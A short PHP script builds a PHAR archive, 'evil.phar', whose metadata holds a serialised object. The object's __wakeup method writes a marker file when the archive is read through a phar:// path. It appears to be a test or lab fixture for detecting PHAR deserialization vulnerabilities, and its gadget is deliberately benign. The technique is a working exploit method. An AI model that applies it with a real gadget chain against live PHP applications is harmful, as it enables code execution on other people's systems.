<?php
/**
 * Build a polyglot PHAR archive whose metadata is a serialised BenignMarker.
 *
 * Run with:  php -d phar.readonly=0 build_phar.php
 *
 * The resulting /app/evil.phar contains:
 *   - An internal file "x" (so phar:///app/evil.phar/x resolves).
 *   - Metadata: a BenignMarker object whose __wakeup writes /tmp/pcb_marker.txt.
 */

require_once __DIR__ . '/BenignMarker.php';

$pharPath = '/app/evil.phar';

// Remove stale archive if present.
if (file_exists($pharPath)) {
    unlink($pharPath);
}

$phar = new Phar($pharPath);
$phar->startBuffering();

// Add a dummy internal file so phar:///app/evil.phar/x resolves.
$phar->addFromString('x', 'placeholder');

// Set the stub (required for a valid PHAR).
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// The payload: a benign gadget whose __wakeup writes a marker.
$gadget = new BenignMarker();
$gadget->marker_path = '/tmp/pcb_marker.txt';
$gadget->sentinel    = 'PHAR_DESERIALIZED';

$phar->setMetadata($gadget);
$phar->stopBuffering();

echo "Built $pharPath (" . filesize($pharPath) . " bytes)\n";
